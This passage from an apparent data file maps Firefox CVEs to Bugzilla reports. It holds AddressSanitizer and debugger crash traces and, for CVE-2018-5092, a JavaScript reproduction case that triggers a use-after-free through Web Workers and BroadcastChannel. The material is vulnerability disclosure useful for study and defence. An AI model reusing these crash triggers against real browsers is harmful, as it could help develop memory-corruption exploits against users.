JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:541:10 #25 0x7f94b625b40c in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:3036:12 #26 0x7f94ad79bae4 in mozilla::dom::RTCDTMFSenderJSImpl::InsertDTMF(nsTSubstring<char16_t> const&, unsigned int, unsigned int, mozilla::ErrorResult&, JSCompartment*) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/RTCDTMFSenderBinding.cpp:728:8 #27 0x7f94ad8d2033 in InsertDTMF /builds/worker/workspace/build/src/obj-firefox/dom/bindings/RTCDTMFSenderBinding.cpp:891:17 #28 0x7f94ad8d2033 in mozilla::dom::RTCDTMFSenderBinding::insertDTMF(JSContext*, JS::Handle<JSObject*>, mozilla::dom::RTCDTMFSender*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/RTCDTMFSenderBinding.cpp:64 #29 0x7f94aecc2ad7 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3042:13 #30 0x7f94b5761041 in CallJSNative /builds/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #31 0x7f94b5761041 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:473 #32 0x7f94b57470a8 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:528:12 #33 0x7f94b57470a8 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3096 #34 0x7f94b5733810 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:423:12 #35 0x7f94b57614ce in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:495:15 #36 0x7f94b5761fd2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:541:10 #37 0x7f94b6544b52 in js::ForwardingProxyHandler::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /builds/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:176:12 #38 0x7f94b64f261d in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /builds/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:359:23 #39 0x7f94ab3a622b in xpc::JSXrayTraits::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&, js::Wrapper const&) /builds/worker/workspace/build/src/js/xpconnect/wrappers/XrayWrapper.h:282:33 #40 0x7f94b6522d51 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /builds/worker/workspace/build/src/js/src/proxy/Proxy.cpp:511:21 previously allocated by thread T0 (file:// Content) here: #0 0x4bee13 in malloc /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:88:3 #1 0x4efe2d in moz_xmalloc /builds/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:84:17 #2 0x7f94a999c71a in Malloc /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:211:46 #3 0x7f94a999c71a in nsTArrayInfallibleAllocator::ResultTypeProxy nsTArray_base<nsTArrayInfallibleAllocator, nsTArray_CopyWithMemutils>::EnsureCapacity<nsTArrayInfallibleAllocator>(unsigned long, unsigned long) /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray-inl.h:136 #4 0x7f94ab7d413c in AppendElements<nsTArrayInfallibleAllocator> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:1705:49 #5 0x7f94ab7d413c in AppendElement<nsTArrayInfallibleAllocator> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:1733 #6 0x7f94ab7d413c in mozilla::PeerConnectionImpl::InsertDTMF(mozilla::TransceiverImpl&, nsTSubstring<char16_t> const&, unsigned int, unsigned int) /builds/worker/workspace/build/src/media/webrtc/signaling/src/peerconnection/PeerConnectionImpl.cpp:2453 #7 0x7f94ad631a03 in InsertDTMF /builds/worker/workspace/build/src/media/webrtc/signaling/src/peerconnection/PeerConnectionImpl.h:422:10 #8 0x7f94ad631a03 in mozilla::dom::PeerConnectionImplBinding::insertDTMF(JSContext*, JS::Handle<JSObject*>, mozilla::PeerConnectionImpl*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/PeerConnectionImplBinding.cpp:483 #9 0x7f94aecc2ad7 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3042:13 #10 0x7f94b5761041 in CallJSNative /builds/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #11 0x7f94b5761041 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:473 #12 0x7f94b57470a8 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:528:12 #13 0x7f94b57470a8 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3096 #14 0x7f94b5733810 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:423:12 #15 0x7f94b57614ce in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:495:15 #16 0x7f94b57470a8 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:528:12 #17 0x7f94b57470a8 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3096 #18 0x7f94b5733810 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:423:12 #19 0x7f94b57614ce in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:495:15 #20 0x7f94b57470a8 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:528:12 #21 0x7f94b57470a8 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3096 #22 0x7f94b5733810 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:423:12 #23 0x7f94b57614ce in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:495:15 #24 0x7f94b5761fd2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:541:10 #25 0x7f94b625b40c in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:3036:12 #26 0x7f94ad79bae4 in mozilla::dom::RTCDTMFSenderJSImpl::InsertDTMF(nsTSubstring<char16_t> const&, unsigned int, unsigned int, mozilla::ErrorResult&, JSCompartment*) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/RTCDTMFSenderBinding.cpp:728:8 #27 0x7f94ad8d2033 in InsertDTMF /builds/worker/workspace/build/src/obj-firefox/dom/bindings/RTCDTMFSenderBinding.cpp:891:17 #28 0x7f94ad8d2033 in mozilla::dom::RTCDTMFSenderBinding::insertDTMF(JSContext*, JS::Handle<JSObject*>, mozilla::dom::RTCDTMFSender*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/RTCDTMFSenderBinding.cpp:64 #29 0x7f94aecc2ad7 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3042:13 #30 0x7f94b5761041 in CallJSNative /builds/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #31 0x7f94b5761041 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:473 #32 0x7f94b57470a8 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:528:12 #33 0x7f94b57470a8 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3096 #34 0x7f94b5733810 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:423:12 #35 0x7f94b57614ce in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:495:15 #36 0x7f94b5761fd2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:541:10 #37 0x7f94b593cd14 in PromiseReactionJob(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/js/src/builtin/Promise.cpp:1238:14 #38 0x7f94b5761041 in CallJSNative /builds/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #39 0x7f94b5761041 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:473 #40 0x7f94b5761fd2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:541:10 #41 0x7f94b625b40c in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:3036:12 SUMMARY: AddressSanitizer: heap-use-after-free /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTStringRepr.h:186:12 in IsEmpty Shadow bytes around the buggy address: 0x0c0c8002b120: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c0c8002b130: fd fd fd fd fd fd fd fa fa fa fa fa fd fd fd fd 0x0c0c8002b140: fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fd 0x0c0c8002b150: fa fa fa fa fd fd fd fd fd fd fd fa fa fa fa fa 0x0c0c8002b160: fd fd fd fd fd fd fd fa fa fa fa fa fd fd fd fd =>0x0c0c8002b170: fd[fd]fd fa fa fa fa fa fd fd fd fd fd fd fd fa 0x0c0c8002b180: fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa 0x0c0c8002b190: fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd 0x0c0c8002b1a0: fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa 0x0c0c8002b1b0: fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa 0x0c0c8002b1c0: fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==9169==ABORTING"
      }
    ],
    "CVE-2018-5092": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1418074",
        "title": "Web Workers - Use After Free in nsWrapperCache::GetWrapperPreserveColor()",
        "description": "Reproduction test case (full server code in attached file UAF_GetWrapperPreserveColor_Repro.js): Main Page code: <script type=\"text/javascript\"> var worker = new Worker(\"worker0.js\"); var bc0 = new BroadcastChannel(\"test_channel\"); setTimeout(function(){ try{ bc0.postMessage(\"n82z8laAh2f004\");}catch(e){} }, 10); setTimeout(function(){location.reload();},300); </script> Worker code: onerror = function (e) {fetch(\"./fetchedfile0.html\", {signal:abortSig0}).then(function(res) {res.text().then(function(txt) {}).catch(function(error) {});}).catch(function(error) {}); }; var abortCtl0 = new AbortController(); var abortSig0 = abortCtl0.signal; var bc0 = new BroadcastChannel(\"test_channel\"); setInterval(function(){ try{ bc0.postMessage(\"\");}catch(e){} xmlReq0.setRequestHeader(\"X-Custom-Header\", \"\"); try{ close();} catch(e){} }, 32); var xmlReq0 = new XMLHttpRequest(); Steps to reproduce: 1. Run server side script UAF_GetWrapperPreserveColor_Repro.js with Node.js (node UAF_GetWrapperPreserveColor_Repro.js). 2. Enter http://localhost:12345 in Firefox browser. 3. Firefox crashes in nsWrapperCache::GetWrapperPreserveColor() by accessing freed memory: (3120.42b0): Access violation - code c0000005 (!!! second chance !!!) eax=4f4f4f4f ebx=12dba798 ecx=00598154 edx=2422d060 esi=00598154 edi=0056a2a4 eip=1029c3d0 esp=008bea34 ebp=008bea3c iopl=0 nv up ei pl nz na po nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010202 xul!JS::shadow::Zone::isGCSweepingOrCompacting+0x2 [inlined in xul!nsWrapperCache::GetWrapperPreserveColor+0x2c]: 1029c3d0 8a400c mov al,byte ptr [eax+0Ch] ds:002b:4f4f4f5b=?? Firefox version: 59.0a1 (2017-11-16) (32-bit) OS: Windows 10 Stack trace: (3120.42b0): Access violation - code c0000005 (!!! second chance !!!) eax=4f4f4f4f ebx=12dba798 ecx=00598154 edx=2422d060 esi=00598154 edi=0056a2a4 eip=1029c3d0 esp=008bea34 ebp=008bea3c iopl=0 nv up ei pl nz na po nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010202 xul!JS::shadow::Zone::isGCSweepingOrCompacting+0x2 [inlined in xul!nsWrapperCache::GetWrapperPreserveColor+0x2c]: 1029c3d0 8a400c mov al,byte ptr [eax+0Ch] ds:002b:4f4f4f5b=?? 2:024> !analyze -v ******************************************************************************* * * * Exception Analysis * * * ******************************************************************************* FAULTING_IP: xul!nsWrapperCache::GetWrapperPreserveColor+2c [z:\\build\\build\\src\\dom\\base\\nswrappercacheinlines.h @ 18] 1029c3d0 8a400c mov al,byte ptr [eax+0Ch] EXCEPTION_RECORD: (.exr -1) ExceptionAddress: 1029c3d0 (xul!JS::shadow::Zone::isGCSweepingOrCompacting+0x00000002) ExceptionCode: c0000005 (Access violation) ExceptionFlags: 00000000 NumberParameters: 2 Parameter[0]: 00000000 Parameter[1]: 4f4f4f5b Attempt to read from address 4f4f4f5b FAULTING_THREAD: 00001020 DEFAULT_BUCKET_ID: INVALID_POINTER_READ PROCESS_NAME: firefox.exe ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s. EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s. EXCEPTION_PARAMETER1: 00000000 EXCEPTION_PARAMETER2: 4f4f4f5b READ_ADDRESS: 4f4f4f5b FOLLOWUP_IP: xul!nsWrapperCache::GetWrapperPreserveColor+2c [z:\\build\\build\\src\\dom\\base\\nswrappercacheinlines.h @ 18] 1029c3d0 8a400c mov al,byte ptr [eax+0Ch] BUGCHECK_STR: INVALID_POINTER_READ NTGLOBALFLAG: 400 APPLICATION_VERIFIER_FLAGS: 0 APP: firefox.exe ANALYSIS_VERSION: 10.0.10240.9 x86fre LAST_CONTROL_TRANSFER: from 104a6319 to 1029c3d0 STACK_TEXT: 008bea3c 104a6319 11574d73 0056a2a4 008beaf8 xul!nsWrapperCache::GetWrapperPreserveColor+0x2c 008bea40 11574d73 0056a2a4 008beaf8 12dba798 xul!nsWrapperCache::HasKnownLiveWrapper+0x5 008bea54 10b27c3e 12dba798 00598150 00000000 xul!mozilla::DOMEventTargetHelper::cycleCollection::CanSkipReal+0x11 008bea78 10b247a5 005f4224 12dba798 12a722a0 xul!RemoveSkippableVisitor::Visit+0x9b 008beae4 10b27409 008beaf8 008bebb0 005f4190 xul!nsPurpleBuffer::VisitEntries<RemoveSkippableVisitor>+0xdc 008beb1c 10b262a6 005f4190 008bebb0 00000000 xul!nsPurpleBuffer::RemoveSkippable+0x44 008beb54 10b27f1d 008bebb0 00000000 008bec01 xul!nsCycleCollector::ForgetSkippable+0x6b 008beb7c 111110e6 008bec01 008bec48 008bec94 xul!nsCycleCollector_forgetSkippable+0x46 008bec28 1110f09e 00000000 00000000 00000000 xul!FireForgetSkippable+0xab 008bec74 104d805f 00000000 00000000 00000000 xul!CCRunnerFired+0x1d6 008bec9c 104d6bba 008becc0 1f037fe8 05cdf3a0 xul!std::_Func_impl_no_alloc<bool (__cdecl*)(mozilla::TimeStamp),bool,mozilla::TimeStamp>::_Do_call+0x17 008becf0 104d6b4b 05cdf3a0 1f037fbc 008bede4 xul!mozilla::IdleTaskRunner::Run+0x62 008bed00 104837a6 005bb9d0 05cdf3a0 12db9e50 xul!mozilla::TimedOut+0x17 008bede4 1048367d 00000001 008bf3c0 05cde3c0 xul!nsTimerImpl::Fire+0x11f 008bee1c 10b3d4da 1f863124 008bf3c0 00537c10 xul!nsTimerEvent::Run+0x37 008bee5c 101254ba 05cde3c0 00501200 005011f0 xul!mozilla::SchedulerGroup::Runnable::Run+0x4f 008bf3c8 10254d2a 00537c10 00000000 008bf3f3 xul!nsThread::ProcessNextEvent+0x294 008bf3f4 10ce59ab 008bf570 008bf570 00503040 xul!mozilla::ipc::MessagePump::Run+0x75 008bf410 104d115d 008bf570 a33ff06a 05b81f70 xul!mozilla::ipc::MessagePumpForChildProcess::Run+0x58 008bf448 104d111d 00537c10 00000002 00503000 xul!MessageLoop::RunHandler+0x1f 008bf468 1066508c 05b81f70 008bf570 008bf488 xul!MessageLoop::Run+0x19 008bf478 10664e18 05b81f70 05b81f70 008bf4a0 xul!nsBaseAppShell::Run+0x34 008bf488 12348b3b 05b81f70 008bf570 005011f0 xul!nsAppShell::Run+0x26 008bf4a0 10ce5969 008bf570 005011f0 008bf4e8 xul!XRE_RunAppShell+0x30 008bf4b0 104d115d 008bf570 a33ff0ca 00000013 xul!mozilla::ipc::MessagePumpForChildProcess::Run+0x16 008bf4e8 104d111d 00519800 00000001 125ad300 xul!MessageLoop::RunHandler+0x1f 008bf508 123489c4 005060f0 00000016 00503040 xul!MessageLoop::Run+0x19 008bf62c 1234b796 008bf658 008bf660 009295cf xul!XRE_InitChildProcess+0x4bd 008bf638 009295cf 00000016 00503040 008bf658 xul!mozilla::BootstrapImpl::XRE_InitChildProcess+0x11 008bf660 009264d8 00503040 00182970 74bd9304 firefox!content_process_main+0x74 008bf9b8 009251f9 00000017 ffc7f930 00183478 firefox!wmain+0x5478 008bfa00 76898744 00a0c000 76898720 c740e5a1 firefox!__scrt_common_main_seh+0xf8 008bfa14 770b582d 00a0c000 c6c4fbfd 00000000 KERNEL32!BaseThreadInitThunk+0x24 008bfa5c 770b57fd ffffffff 770d6374 00000000 ntdll!__RtlUserThreadStart+0x2f 008bfa6c 00000000 0092526f 00a0c000 00000000 ntdll!_RtlUserThreadStart+0x1b FAULTING_SOURCE_LINE: z:\\build\\build\\src\\dom\\base\\nswrappercacheinlines.h FAULTING_SOURCE_FILE: z:\\build\\build\\src\\dom\\base\\nswrappercacheinlines.h FAULTING_SOURCE_LINE_NUMBER: 18 SYMBOL_STACK_INDEX: 0 SYMBOL_NAME: xul!nsWrapperCache::GetWrapperPreserveColor+2c FOLLOWUP_NAME: MachineOwner MODULE_NAME: xul IMAGE_NAME: xul.dll DEBUG_FLR_IMAGE_TIMESTAMP: 5a0d7710 STACK_COMMAND: ~24s ; kb BUCKET_ID: INVALID_POINTER_READ_xul!nsWrapperCache::GetWrapperPreserveColor+2c PRIMARY_PROBLEM_CLASS: INVALID_POINTER_READ_xul!nsWrapperCache::GetWrapperPreserveColor+2c FAILURE_PROBLEM_CLASS: INVALID_POINTER_READ FAILURE_EXCEPTION_CODE: c0000005 FAILURE_IMAGE_NAME: xul.dll FAILURE_FUNCTION_NAME: nsWrapperCache::GetWrapperPreserveColor FAILURE_SYMBOL_NAME: xul.dll!nsWrapperCache::GetWrapperPreserveColor FAILURE_BUCKET_ID: INVALID_POINTER_READ_c0000005_xul.dll!nsWrapperCache::GetWrapperPreserveColor ANALYSIS_SOURCE: UM FAILURE_ID_HASH_STRING: um:invalid_pointer_read_c0000005_xul.dll!nswrappercache::getwrapperpreservecolor FAILURE_ID_HASH: {2ed7a18c-a2cc-a85d-619a-216c25b2cb62} Followup: MachineOwner ---------"
      }
    ],
    "CVE-2018-5093": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1415291",
        "title": "Heap-buffer-overflow READ 8 · js::WasmTableObject::getImpl",
        "description": "This bug was found by Google's OSS-Fuzz running their custom internal JS fuzzer. I am refiling it in our issue tracker. Please note that they apply a 90-day disclose timeline to all bugs: [Environment] ASAN_OPTIONS = redzone=256:strict_memcmp=0:allow_user_segv_handler=1:allocator_may_return_null=1:handle_sigfpe=1:handle_sigbus=1:detect_stack_use_after_return=0:alloc_dealloc_mismatch=0:print_scariness=1:max_uar_stack_size_log=16:detect_odr_violation=0:handle_sigill=1:coverage=0:use_sigaltstack=1:fast_unwind_on_fatal=1:detect_leaks=0:print_summary=1:handle_abort=1:check_malloc_usable_size=0:detect_container_overflow=1:symbolize=0:handle_segv=1 ================================================================= ==13600==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6110001b4c80 at pc 0x0000028d59ae bp 0x7ffdebc428b0 sp 0x7ffdebc428a8 READ of size 8 at 0x6110001b4c80 thread T0 SCARINESS: 23 (8-byte-read-heap-buffer-overflow) #0 0x28d59ad in js::WasmTableObject::getImpl(JSContext*, JS::CallArgs const&) mozilla-central/js/src/wasm/WasmJS.cpp:1719:15 #1 0x28d5ea4 in bool JS::CallNonGenericMethod<&(IsTable(JS::Handle<JS::Value>)), &js::WasmTableObject::getImpl>(JSContext*, JS::CallArgs const&) mozilla-central/js/src/build_DBG.OBJ/dist/include/js/CallNonGenericMethod.h:100:16 #2 0x28d5ea4 in js::WasmTableObject::get(JSContext*, unsigned int, JS::Value*) mozilla-central/js/src/wasm/WasmJS.cpp:1741 #3 0x8bb754 in js::CallJSNative(JSContext*, bool (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) mozilla-central/js/src/jscntxtinlines.h:291:15 #4 0x8bb754 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) mozilla-central/js/src/vm/Interpreter.cpp:472 #5 0x8a5edd in js::CallFromStack(JSContext*, JS::CallArgs const&) mozilla-central/js/src/vm/Interpreter.cpp:527:12 #6 0x8a5edd in Interpret(JSContext*, js::RunState&) mozilla-central/js/src/vm/Interpreter.cpp:3061 #7 0x885088 in js::RunScript(JSContext*, js::RunState&) mozilla-central/js/src/vm/Interpreter.cpp:422:12 #8 0x8c10d4 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) mozilla-central/js/src/vm/Interpreter.cpp:705:15 #9 0x8c1dc6 in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) mozilla-central/js/src/vm/Interpreter.cpp:737:12 #10 0x1894d40 in ExecuteScript(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSScript*>, JS::Value*) mozilla-central/js/src/jsapi.cpp:4702:12 #11 0x1895267 in JS_ExecuteScript(JSContext*, JS::Handle<JSScript*>) mozilla-central/js/src/jsapi.cpp:4735:12 #12 0x5d5d8d in RunFile(JSContext*, char const*, _IO_FILE*, bool) mozilla-central/js/src/shell/js.cpp:695:14 #13 0x5d5d8d in Process(JSContext*, char const*, bool, FileKind) mozilla-central/js/src/shell/js.cpp:1048 #14 0x56a13f in ProcessArgs(JSContext*, js::cli::OptionParser*) mozilla-central/js/src/shell/js.cpp:8175:14 #15 0x56a13f in Shell(JSContext*, js::cli::OptionParser*, char**) mozilla-central/js/src/shell/js.cpp:8547 #16 0x56a13f in main mozilla-central/js/src/shell/js.cpp:8960 #17 0x7fe5647af82f in __libc_start_main /build/glibc-bfm8X4/glibc-2.23/csu/libc-start.c:291 0x6110001b4c81 is located 0 bytes to the right of 1-byte region [0x6110001b4c80,0x6110001b4c81) allocated by thread T0 here: #0 0x51a0f0 in __interceptor_calloc _asan_rtl_ #1 0x291ef2f in js_calloc(unsigned long) mozilla-central/js/src/build_DBG.OBJ/dist/include/js/Utility.h:376:12 #2 0x291ef2f in js::wasm::ExternalTableElem* js_pod_calloc<js::wasm::ExternalTableElem>(unsigned long) mozilla-central/js/src/build_DBG.OBJ/dist/include/js/Utility.h:571 #3 0x291ef2f in js::wasm::ExternalTableElem* js::MallocProvider<JSContext>::maybe_pod_calloc<js::wasm::ExternalTableElem>(unsigned long) mozilla-central/js/src/vm/MallocProvider.h:62 #4 0x291ef2f in js::wasm::ExternalTableElem* js::MallocProvider<JSContext>::pod_calloc<js::wasm::ExternalTableElem>(unsigned long) mozilla-central/js/src/vm/MallocProvider.h:132 #5 0x28d2f4f in js::wasm::Table::create(JSContext*, js::wasm::TableDesc const&, JS::Handle<js::WasmTableObject*>) mozilla-central/js/src/wasm/WasmTable.cpp:52:35 #6 0x28d2354 in js::WasmTableObject::create(JSContext*, js::wasm::Limits const&) mozilla-central/js/src/wasm/WasmJS.cpp:1619:25 #7 0x28d3b0e in js::WasmTableObject::construct(JSContext*, unsigned int, JS::Value*) mozilla-central/js/src/wasm/WasmJS.cpp:1674:37 #8 0x8efb57 in js::CallJSNative(JSContext*, bool (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) mozilla-central/js/src/jscntxtinlines.h:291:15 #9 0x8efb57 in js::CallJSNativeConstructor(JSContext*, bool (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) mozilla-central/js/src/jscntxtinlines.h:324 #10 0x8bea61 in InternalConstruct(JSContext*, js::AnyConstructArgs const&) mozilla-central/js/src/vm/Interpreter.cpp:567:20 #11 0x8a55c1 in Interpret(JSContext*, js::RunState&) mozilla-central/js/src/vm/Interpreter.cpp:3053:18 #12 0x885088 in js::RunScript(JSContext*, js::RunState&) mozilla-central/js/src/vm/Interpreter.cpp:422:12 #13 0x8c10d4 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) mozilla-central/js/src/vm/Interpreter.cpp:705:15 #14 0x8c1dc6 in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) mozilla-central/js/src/vm/Interpreter.cpp:737:12 #15 0x1894d40 in ExecuteScript(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSScript*>, JS::Value*) mozilla-central/js/src/jsapi.cpp:4702:12 #16 0x1895267 in JS_ExecuteScript(JSContext*, JS::Handle<JSScript*>) mozilla-central/js/src/jsapi.cpp:4735:12 #17 0x5d5d8d in RunFile(JSContext*, char const*, _IO_FILE*, bool) mozilla-central/js/src/shell/js.cpp:695:14 #18 0x5d5d8d in Process(JSContext*, char const*, bool, FileKind) mozilla-central/js/src/shell/js.cpp:1048 #19 0x56a13f in ProcessArgs(JSContext*, js::cli::OptionParser*) mozilla-central/js/src/shell/js.cpp:8175:14 #20 0x56a13f in Shell(JSContext*, js::cli::OptionParser*, char**) mozilla-central/js/src/shell/js.cpp:8547 #21 0x56a13f in main mozilla-central/js/src/shell/js.cpp:8960 #22 0x7fe5647af82f in __libc_start_main /build/glibc-bfm8X4/glibc-2.23/csu/libc-start.c:291 SUMMARY: AddressSanitizer: heap-buffer-overflow (/mnt/scratch0/clusterfuzz/slave-bot/builds/clusterfuzz-builds-no-engine_spidermonkey_6aad6e0d14f81d36f48dbd887aa56b38e87859f7/revisions/js+0x28d59ad) Shadow bytes around the buggy address: 0x0c228002e940: 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa 0x0c228002e950: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c228002e960: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 0x0c228002e970: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c228002e980: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa =>0x0c228002e990:[01]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c228002e9a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c228002e9b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c228002e9c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c228002e9d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c228002e9e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 